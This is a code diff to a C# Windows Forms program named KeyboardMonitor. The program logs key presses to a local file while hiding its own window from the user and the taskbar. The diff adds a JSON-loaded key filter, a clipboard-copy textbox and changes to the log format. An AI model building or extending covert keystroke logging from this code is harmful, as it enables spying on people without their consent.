@@ -104,6 +104,11 @@ namespace KeyboardMonitor
 		/// 当前程序名称
 		/// </summary>
 		public static string ApplicetionName;
+
+		/// <summary>
+		/// 按键过滤器
+		/// </summary>
+		public string[] KeyboardFiltartion = null;
 		private System.Windows.Forms.Timer timer = null;
 		public Form()
 		{
@@ -111,6 +116,7 @@ namespace KeyboardMonitor
 			this.InitForm();
 		}
 
+		public static TextBox textBox = null;
 		private void InitializeComponent()
 		{
 			try
@@ -121,7 +127,7 @@ namespace KeyboardMonitor
 				this.SuspendLayout();
 				this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 15F);
 				this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-				this.ClientSize = new System.Drawing.Size(0, 0);
+				this.ClientSize = new System.Drawing.Size(100,50);
 				this.Name = "";
 				this.Text = "";
 				this.KeyDown += new KeyEventHandler(this.OnKeyDownEvent);
@@ -134,13 +140,16 @@ namespace KeyboardMonitor
 				this.timer.Interval = int.Parse(global::KeyboardMonitor.Properties.Resource.CommitDataInterval);
 				this.timer.Tick += new EventHandler(this.TimerCommitData);
 
+				//这个textBox用于显示当前按下的键，需要让窗体显示
+				textBox = new TextBox();
+				textBox.Click += new EventHandler((s,e)=> Clipboard.SetText(((TextBox)s).Text));
+				this.Controls.Add(textBox);
+
 				//隐藏窗体程序
-				//this.Hide();
-				//this.Visible = false;
-				//this.FormBorderStyle = FormBorderStyle.None;
 				this.WindowState = FormWindowState.Minimized;
 				this.ShowInTaskbar = false;
 				SetVisibleCore(false);
+
 				this.ResumeLayout(false);
 			}
 			catch (Exception)
@@ -157,13 +166,14 @@ namespace KeyboardMonitor
 				string[] dataArray = this.keys.Select(
 							(keys) => keys.ToString()
 						).ToArray();
-				string data = string.Join(",", dataArray);
+				//
+				string data = string.Join("\n", dataArray);
 				//写入本地文件
 				string dateTime = DateTime.Now.ToString("yyyyMMddHHmmss");
 				//data = "\n=======================================================" + dateTime
 				//	+ "\n"+data
 				//	+ "\n=======================================================" + dateTime;
-				data = "," + data;
+				data = "\n" + data;
 				LogHelper.WriteLog(data);
 				this.keys.Clear();
 				//throw new Exception();
@@ -209,6 +219,12 @@ namespace KeyboardMonitor
 
 				//初始化按键集合
 				this.keys = new List<Keys>();
+				//初始化按键过滤器
+				string json = Encoding.GetEncoding("GB2312").GetString(global::KeyboardMonitor.Properties.Resource.KeyboardFiltartion1);
+				//替换掉文件中的非法字符
+				json = json.Replace("\r","").Replace("\n","").Replace("\t","");
+				dynamic dynamicKeyboardFiltartion = Newtonsoft.Json.JsonConvert.DeserializeObject(json);
+				this.KeyboardFiltartion = ((Newtonsoft.Json.Linq.JArray)dynamicKeyboardFiltartion.KeyboardFiltartion).Select((s)=>s.ToString()).ToArray();
 
 				//获取进程名称
 				Process curProcess = Process.GetCurrentProcess();
@@ -251,9 +267,11 @@ namespace KeyboardMonitor
 		/// <param name="e"></param>
 		private void OnKeyDownEvent(object sender, KeyEventArgs e)
 		{
-			  this.keys.Add(e.KeyData);
+			if (this.KeyboardFiltartion.Contains(e.KeyData.ToString()) ==false)
+			{
+				this.keys.Add(e.KeyData);
+			}
 		}
-
 		/// <summary>
 		/// 
 		/// </summary>
